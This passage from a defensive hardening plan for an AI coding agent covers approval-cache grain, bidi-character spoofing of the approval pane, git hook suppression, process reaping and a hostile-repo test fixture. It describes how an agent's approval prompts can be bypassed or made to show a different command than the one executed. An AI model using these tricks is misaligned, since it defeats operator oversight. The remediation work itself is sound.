in the doc comment.

Pass `--no-verify` on committing paths, set `GIT_CONFIG_NOSYSTEM=1`, and pass `-c core.hooksPath=`
and `--no-textconv` where applicable.

**Tests:** a fixture repo with a `pre-commit` hook that must not run; a `.gitattributes` textconv
that must not fire.
**Acceptance:**
- `go test -race ./internal/tools/...` passes, including both fixtures.
**commit:** `fix(tools): stop repo-supplied git hooks and filters from running`

---

# Cluster D — Ranked positions the first pass dropped

Audit positions 8, 10, 11 and 12. Each was confirmed live at `b0252d4` by the re-verification
pass; none is covered by an existing item and none is named in **Out of scope**. Items 16 and 17
belong to Cluster B's surface and 18–19 to Cluster A's, but they are numbered here so the
existing items keep their numbers and their cross-references.

## 16. Give allow-for-session a grain that bounds blast radius

**What:** `gateCacheKey` (`internal/agent/resolution.go:451-458`) returns bare `call.Tool` —
arguments are never part of the key. So one "allow for session" on `terminal` pre-clears **every**
later shell command for the Session, and an approved gate runs with a nil confinement box
(`dispatch.go:415`). The memory is shared by the whole agent tree (`approvalcache.go:9-14`), so an
allow granted inside a sub-agent clears the prompt for its parent and siblings too.

Argue the grain, not the lifetime — the audit is right that lifetime is documented intent:
`ClearContext`'s doc comment states allow-for-session approvals survive `/clear`. This item does
not touch that, and must not.

Keep the server grain for `classMCP` (ADR 0012's explicit promise, and the
`mcpServerCacheKeyPrefix` namespacing that keeps it collision-proof). For every other gating
class, key on the tool name **plus a canonical digest of the decoded arguments**. Decode with the
same last-wins path the executor uses (`decodeArgs`, `internal/tools/tools.go:67`) and re-marshal
with sorted keys before hashing, so a duplicate or reordered key cannot mint a second key for the
same executed call — the same agreement item 7 forces on the pane. On any decode or marshal
failure, emit the **empty** key: `approvalCache.Allowed` and `.Allow` are already both
empty-key-refusing (`approvalcache.go:29-35`, `:43-49`), so the failure direction is "prompt
again", which is the conservative one.

Deliberate cost, to be stated in the commit body: "allow for session" on `terminal` becomes
per-command-line, so allowing `npm test` no longer clears `npm run build`. That is the finding,
not a side effect — but it is a real ergonomics change and the operator will notice it.

**Tests:** no test pins the key's grain — add one asserting two `terminal` calls with different
`command` values produce different keys, and that two byte-orderings of the same arguments produce
the same key; a case asserting a duplicate `command` key produces the key of the **decoded**
(last-wins) value; a case asserting `classMCP` still keys at server grain; a case asserting a
malformed argument blob yields the empty key and therefore re-prompts.
**Acceptance:**
- `go test -race ./internal/agent/...` passes, including the existing MCP server-grain tests.
- `grep -n "func gateCacheKey" -A 20 internal/agent/resolution.go` shows the arguments reaching
  the key for non-MCP classes.
**commit:** `fix(agent): key allow-for-session on the arguments, not just the tool name`

## 17. Strip bidi controls at the three seams that keep them

**Depends on item 6** (same render path; do this after the field flattening lands).

**What:** A right-to-left override in a tool argument visually reorders the approval line, so the
pane reads as one command and the executor runs another — the same "read one thing, run another"
family as items 6 and 7, but invisible to both, because flattening `\n` does nothing to U+202E.
Without this item, Cluster B's claim to close the approval surface is incomplete.

Correction to the audit, which claims all three strippers are Cc-only: `web_fetch.go:161` and
`library/store.go:386` already test `unicode.In(r, unicode.Cf, unicode.Co, unicode.Cs)` and are
fine. The three seams that are **not** are `stripEscapes` (`internal/tui/transcript.go:1356`,
`r < 0x20 || r == 0x7f`), `strippableControl` (`internal/title/title.go:411`,
`unicode.IsControl(r) && !unicode.IsSpace(r)`) and the session-id validator
(`internal/session/store.go:73`, the same `< 0x20 || 0x7f` test). The first is the decision
surface; the other two are how a forged title rides into a saved session and back out onto the
history browser.

Drop the **bidi set** — U+202A–U+202E, U+2066–U+2069, U+200E, U+200F — rather than all of
`unicode.Cf`. Cf also contains U+200D ZWJ, which is load-bearing for emoji sequences, and U+00AD
soft hyphen; blanket-dropping it at a *display* seam would mangle legitimate user text. The
ingestion and storage seams that already drop all of Cf are a deliberate asymmetry, not an
inconsistency to repair — say so in the comment, or someone will "fix" it later.

**Tests:** no test uses a bidi control anywhere — add one per seam asserting the payload does not
survive; a case asserting U+200D ZWJ **does** survive `stripEscapes`, so the narrow set is pinned
as narrow and a later blanket change breaks a test rather than emoji.
**Acceptance:**
- `go test -race ./internal/tui/... ./internal/title/... ./internal/session/...` passes.
- A tool argument containing U+202E renders in pane order, asserted by test.
**commit:** `fix(tui,title,session): strip bidi controls at the seams that kept them`

## 18. Reap the process group on a clean exit, and stop reporting a wedged drain as success

**What:** `cmd.Cancel` is the only thing that signals the process group, and it runs on ctx
cancellation alone (`internal/tools/exec_pgroup_unix.go:37`, `exec_pgroup_other.go:51`). A normal
exit never signals it, so a backgrounded grandchild outlives the tool call; `cmd.WaitDelay` caps
the parent's block at five seconds (`processWaitDelay`, `exec_pgroup_unix.go:60`), and because `exec.ErrWaitDelay` is
not an `*exec.ExitError`, `exitCodeOf` (`exec_common.go:159-173`) falls through to
`cmd.ProcessState.ExitCode()` — 0, when the leader itself exited cleanly. So a persistence
primitive renders as a green tick. No reaper exists at shutdown either.

Two changes. Run the teardown after a normal `Wait` as well as on cancellation, so a one-shot tool
call leaves no descendants — which is what the tool's own contract already promises
(`terminal.go:35-40`, "one-shot, a fresh process per call, no persistent shell", per ADR 0008), so
this closes a gap between the contract and the code rather than choosing a new policy. And detect
`errors.Is(runErr, exec.ErrWaitDelay)` in `exitCodeOf`'s caller, surfacing it on the result rather
than flattening it to 0: the operator needs to know descendants were still holding the pipe and
were killed.

Deliberate cost, for the commit body and the version-bump note: a `terminal` call that
intentionally backgrounds a long-running server now has it reaped when the call returns. That is
already the documented contract, but it is behaviour someone is relying on by accident.

**Tests:** a fixture spawning a grandchild that outlives its parent, asserting the grandchild is
gone after a **clean** exit (today only the cancel path is covered); a case asserting an
`ErrWaitDelay` run does not report exit code 0.
**Acceptance:**
- `go test -race ./internal/tools/...` passes, including the existing cancel-path teardown tests.
- The new grandchild test fails when the post-`Wait` teardown call is reverted (state the check
  in NOTES).
**commit:** `fix(tools): reap the process group on a clean exit and report a wedged drain`

## 19. Give the Go toolchain its own environment, and disclose the package it vets

**What:** `runGoVet` (`internal/tools/diagnostics.go:199-208`) passes `env: safeGitEnv()` — git's
allowlist (`git.go:55-59`) applied to the Go toolchain. `GOFLAGS`, `GOWORK`, `GOTOOLCHAIN`,
`GOPATH`, `GOMODCACHE`, `CGO_ENABLED` and `CC` are all absent from it, so the operator's own Go
hardening is stripped and **nothing is put back**; `HOME` passes, so the persistent `go env -w`
file still applies. Separately, the tool approves one filename (`path`, `:52`) and vets
`filepath.Dir(abs)` — the whole package (`:202`), which the description never says.

Do not overclaim this: `go vet` never links, so it is a scope-and-honesty defect rather than
demonstrated RCE. The audit says so explicitly and the triage in item 1 should repeat it.

Replace the borrowed allowlist with a Go-specific environment that **pins** the hardening instead
of removing it: `GOFLAGS=-mod=readonly`, `GOWORK=off`, `GOTOOLCHAIN=local` (so a repo's `go.mod`
toolchain line cannot trigger a toolchain download and exec) and `CGO_ENABLED=0` (vet does not
need cgo, and this keeps a repo's `#cgo` directives away from the C compiler). Either set
`GOENV=off` or state the `go env -w` residual in the doc comment — do not leave it unmentioned.
Then name the vetted **package directory** on the approval body and in the result string, so
"I approved `foo.go`" and "it vetted this directory" are the same sentence.

**Tests:** a case pinning the vet subprocess environment key-by-key (nothing pins it today); a
case asserting the result string names the package directory when it differs from the requested
file's own name.
**Acceptance:**
- `go test -race ./internal/tools/...` passes.
- `grep -n "safeGitEnv" internal/tools/diagnostics.go` returns nothing.
**commit:** `fix(tools): pin the Go toolchain environment and name the vetted package`

---

## 20. Reconcile the security documentation

**Depends on items 2, 4, 5, 13, 18, 19.**

**What:** Bring the contracts back in line with the code this plan changed:
`internal/security/doc.go` (the path-safety paragraph, per item 13);
`docs/design/confinement-execution-contract.md` §4 (the exec-site rule from items 2 and 5) and
§2.4 (process-tree teardown, which item 18 extends from the cancel path to every exit);
`internal/present/opener.go`'s allow-list rationale (item 4); `internal/skills/load.go:88`'s
containment claim (item 11); and the `TODO.md` L-block, noting what this batch closed and what it
deliberately left. Two new L-entries belong there: item 2's venv/`node_modules` refusal cost and
item 18's reaping of intentionally-backgrounded processes, both accepted rather than fixed. Write
an ADR **only** if item 13's read-side policy is judged to change the path-safety contract rather
than clarify it — that is the one decision here big enough to outlive the fix, and it is the
implementer's call to raise, not to make alone.

**Tests:** none (documentation only).
**Acceptance:**
- `make check` passes.
- `grep -n "symlink" internal/security/doc.go` reflects the item 13 behaviour.
**commit:** `docs: reconcile the security contracts with the hostile-bytes hardening`

---

## Verification (whole plan)

Run by the closeout pass, after every item is committed:

- `make check`
- `go test -race ./...`

**End-to-end, against a hostile-repo fixture.** Build one throwaway workspace carrying, together: a
root `json.py` writing a marker; `.apogee/skills/confine off --save/SKILL.md` with
`displayName: conf`; a second skills tree reached through an `.apogee/skills → /tmp` symlink; a
`docs → .git` directory symlink; a `report.html` containing a `fetch()` to loopback;
`.git/hooks/pre-commit` writing a marker; and a `.venv/bin/python3`. Then, in a real 80×24
terminal on stock config:

1. `python_exec` running `import json` → marker absent (item 3). Record the interpreter version
   alongside the result: on a pre-3.11 host this passes only via the `-I` fallback.
2. Typing `/conf` + Tab → the row shows its source and does not outrank `/confine` (items 9, 10).
3. `present_document report.html` → degrades to the transcript rung, no browser launch (item 4).
4. A `terminal` call whose last line is a payload → the payload is visible on the pane (item 7).
5. `write_file` to `docs/config` → refused (item 13).
6. `git_commit` → hook marker absent (item 15).
7. A tool call with a duplicate `command` key → the pane shows the executed one (item 7).
8. A `sub_agent` task containing `\nReason: safe` → no forged row (item 6).
9. The symlinked `.apogee/skills` anchor loads zero skills (item 11).
10. With the venv activated, `python_exec` refuses and **names `.venv/bin/python3`** (item 2).
11. "Allow for session" on `terminal npm test`, then `terminal npm run build` → prompts again
    (item 16).
12. A `terminal` command containing U+202E → the pane renders in execution order (item 17).
13. A `terminal` call backgrounding a sleeper → the sleeper is gone when the call returns (item 18).

**Regression watch.** Items 4, 6 and 7 invert existing pinned tests (`opener_test.go:259`,
`model_test.go:1008-1048`, `TestRenderPopupBodyMaxRows`), and item 4 additionally inverts
`TestBrowserRenderableIsASubsetOfTheOpenerSet`. Those are behaviour changes, not test bugs — each
needs its doc comment restated to say why the new behaviour is the correct one, or the change is
not done. Items 2, 16 and 18 each impose a deliberate ergonomics cost (a refused venv
interpreter, a narrower allow-for-session grain, a reaped background process); none may land
without its `TODO.md` L-entry or commit-body note recording the trade.

## Suggested version bump

Not performed by this plan, and no item touches `VERSION`. Once the batch lands it is worth a
**minor** bump rather than a micro: items 3, 4 and 13 are user-visible behaviour changes (a Python
snippet may need an explicit `sys.path` line; an HTML report no longer auto-opens in a browser; a
write through a symlinked directory is refused), and Cluster D adds three more (an activated
in-repo virtualenv makes `python_exec` refuse, per item 2; "allow for session" no longer clears
every later invocation of the same tool, per item 16; an intentionally-backgrounded process is
reaped when its call returns, per item 18). Six user-visible changes is well past what the
per-feature micro-bump convention covers. The decision is the owner's.
